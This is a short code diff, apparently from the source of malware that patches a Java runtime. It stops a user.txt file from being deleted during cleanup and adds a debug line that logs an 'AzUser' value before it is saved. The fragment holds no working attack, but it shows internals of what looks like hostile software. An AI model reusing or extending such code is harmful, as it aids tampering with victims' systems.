@@ -296,7 +296,6 @@ static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAd
 	pDeleteFileA( ".\\rt.ini" );
 	pDeleteFileA( ".\\file.dat" );
 	pDeleteFileA( ".\\uid.txt" );
-	pDeleteFileA( ".\\user.txt" );
 	pDeleteFileA( ".\\rt2.log" );
 	pDeleteFileA( ".\\PatchFail.txt" );
 
@@ -592,6 +591,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	m_lstrcpy( fileName, Path );
 	pPathAppendA( fileName, "user.txt" );
 	string azUser = GetAzUser();
+	DBG( "JavaPatcher",  "AzUser: %s", azUser.t_str() );
 	File::WriteBufferA( fileName, azUser.t_str(), azUser.Length() );
 
 	return true;
